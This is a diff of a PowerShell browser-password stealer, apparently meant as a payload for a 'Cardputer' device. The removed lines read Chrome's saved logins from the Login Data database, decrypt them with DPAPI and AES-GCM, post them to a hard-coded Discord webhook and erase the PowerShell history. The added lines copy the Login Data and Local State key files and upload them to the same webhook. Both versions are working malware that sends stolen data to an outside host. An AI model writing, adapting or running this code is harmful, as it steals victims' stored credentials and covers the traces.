@@ -1,45 +1,34 @@
-$webhook = 'https://discord.com/api/webhooks/1246076287580115045/2xidT8BNCNkVxLdC64rjp04Oul87fDUVtTSHN-gEil_vhYAFDmfLUuYaDIbkHNe8RKKI'
+$hookurl = 'https://discord.com/api/webhooks/1246076287580115045/2xidT8BNCNkVxLdC64rjp04Oul87fDUVtTSHN-gEil_vhYAFDmfLUuYaDIbkHNe8RKKI'
 
-$d = Add-Type -A System.Security
-$p = 'public static'
-$g = "")]$p extern"
-$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
-$m = "[MarshalAs(UnmanagedType.LP"
-$q = '(s,i)'
-$f = '(p s,int i)'
-$z = $env:LOCALAPPDATA + '\Google\Chrome\User Data'
-$u = [Security.Cryptography.ProtectedData]
-Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
+function Upload-Discord {
+    [CmdletBinding()]
+    param(
+        [parameter(Position=0, Mandatory=$False)][string]$file,
+        [parameter(Position=1, Mandatory=$False)][string]$text
+    )
 
-$s = [W]::O("$z\Default\Login Data", [ref]$d)
-$l = @()
-if ($host.Version -like "7*") {
-    $b = (gc "$z\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
-    $x = [Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)], $n, 0))
-}
-$_ = [W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)
-for (; !([W]::S($s) % 100)) {
-    $l += [W]::T($s, 0), [W]::T($s, 3)
-    $c = [W]::B($s, 5)
-    try {
-        $e = $u::Unprotect($c, $n, 0)
-    } catch {
-        if ($x) {
-            $k = $c.length
-            $e = [byte[]]::new($k - 31)
-            $x.Decrypt($c[3..14], $c[15..($k - 17)], $c[($k - 16)..($k - 1)], $e)
-        }
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
     }
-    $l += ($e | % {[char]$_}) -join ''
+
+    if (-not [string]::IsNullOrEmpty($text)) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    if (-not [string]::IsNullOrEmpty($file)) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
 }
-$r = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l) -join ','))
-$r | Out-File -FilePath temp.txt
 
-$content = 'Cardputer Found Chrome Passwords'
-$payload = [PSCustomObject]@{ content = $content }
-Invoke-RestMethod -ContentType "Application/Json" -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
+$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+$outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt"
+Copy-Item $sourceFile1 $outputFile1
+Upload-Discord -file $outputFile1 -text ":)"
+Remove-Item $outputFile1
 
-curl.exe -F "file1=@temp.txt" $webhook
-rm temp.txt
-Remove-Item (Get-PSReadlineOption).HistorySavePath
-exit
+$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+$outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt"
+Copy-Item $sourceFile2 $outputFile2
+Upload-Discord -file $outputFile2 -text "Key-File"
+Remove-Item $outputFile2
